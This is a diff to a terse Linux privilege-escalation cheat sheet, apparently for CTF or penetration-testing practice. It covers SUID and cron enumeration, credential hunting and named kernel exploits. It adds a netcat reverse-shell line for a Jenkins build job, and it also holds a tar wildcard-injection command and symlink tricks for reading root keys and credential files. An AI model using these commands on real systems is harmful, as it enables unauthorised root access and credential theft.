@@ -6,9 +6,8 @@
 2. SUID `find / -perm -4000 -type f 2>/dev/null` = GTFObins (eg find, strace, gcore) 
 3. Cron in /etc/crontab ; PATH has /dev/shm , /usr/local/bin , & so on? Job is writable? 
 4. Find creds in /var/www , databases like *.db 
-5. Run `pspy64` to see creds in running processes (eg mysqldump) 
+5. Run `pspy64` to see creds in running processes (eg mysqldump) or `ss -tulnp` 
 6. Exploits, eg Polkit CVE-2021-4034 , CVE-2026-31431, Dirty Frags 
-
 
 
 #### Unusual exploits 
@@ -16,6 +15,7 @@
 - - Then `echo "" > '--checkpoint=1'` and `echo "" > '--checkpoint-action=exec=sh payload.sh'` and tar. 
 - User in **mlocate** group, run `strings mlocate.db` to find creds file 
 - - Run `ln -sf /path/cred.txt test` then `sudo -u other_user /usr/bin/sync.sh test`. 
+- Jenkins build job = `busybox nc {{LHOST}} {{LPORT}} -e /bin/sh` 
 - If Docker try `ln -s /root/.ssh/id_rsa /var/log/gitlab/root_key` then `unzip /opt/backups/backup.zip` 
 - If custom binary try `ls -al` and `--help` ; if * in custom path try ../../ too. 
 - Create Makefile to add user to sudo group or /etc/sudoers, run make install, `exec su -l user` 
